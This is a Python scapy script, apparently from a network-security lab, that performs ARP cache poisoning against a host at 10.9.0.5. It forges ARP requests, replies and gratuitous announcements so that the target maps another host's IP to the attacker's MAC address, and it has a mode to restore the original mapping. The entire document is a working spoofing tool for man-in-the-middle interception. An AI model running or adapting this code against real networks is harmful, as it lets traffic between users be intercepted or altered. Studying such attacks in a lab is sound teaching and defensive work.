#!/usr/bin/python3
from scapy.all import *
import time
import sys



def ARPRequest(attacker_mac, hijack_host, target_host):
    # Broadcast Request to the target host
    global Broadcast, unknown_mac
    E = Ether(
            dst=Broadcast,
            src=attacker_mac
            )
    A = ARP(
           op=1, # who-has
           hwsrc=attacker_mac,
           psrc=hijack_host,
           hwdst=unknown_mac,
           pdst=target_host
           )
    print("Sending ARP request ...")
    pkt = E/A
    # sendp() function send packets at layer 2
    # send() function send packets at layer 3
    sendp(pkt)

def ARPReply(attacker_mac, hijack_host, target_host, target_mac):
    # Send reply to the target host
    E = Ether(
            dst=target_mac,
            src=attacker_mac
            )
    A = ARP(
            op=2, # is-at
            hwsrc=attacker_mac,
            psrc=hijack_host,
            hwdst=target_mac,
            pdst=target_host
            )
    pkt = E/A
    print("Sending ARP reply ...")
    sendp(pkt)

def ARPGratuitous(attacker_mac, host):
    global Broadcast
    E = Ether(
            dst=Broadcast,
            src=attacker_mac
            )
    A = ARP(
            op=1,
            hwsrc=attacker_mac,
            psrc=host,
            hwdst=Broadcast,
            pdst=host
            )
    pkt = E/A
    print("Sending ARP gratuitous request ...")
    sendp(pkt)

if __name__ == '__main__':
    HostA = '10.9.0.5'
    HostB = '10.9.0.6'
    HostM = '10.9.0.105'
    A_mac = '02:42:0a:09:00:05'
    B_mac = '02:42:0a:09:00:06'
    M_mac = '02:42:0a:09:00:69'
    Broadcast = 'ff:ff:ff:ff:ff:ff'
    unknown_mac = '00:00:00:00:00:00'
    method = int(sys.argv[1])

    if method == 1:
        ARPRequest(attacker_mac=M_mac, hijack_host=HostB, target_host=HostA)
    elif method == 2:
        ARPReply(attacker_mac=M_mac, hijack_host=HostB, target_host=HostA, target_mac=A_mac)
    elif method == 3:
        ARPGratuitous(attacker_mac=M_mac, host=HostB)
    elif method == 0: # Reset ARP table to [HostB_ip] [HostB_mac]
        print("Reset the ARP table to HostB_ip HostB_mac")
        ARPReply(attacker_mac=B_mac, hijack_host=HostB, target_host=HostA, target_mac=A_mac)
    else:
        print("Unexpected Input!")
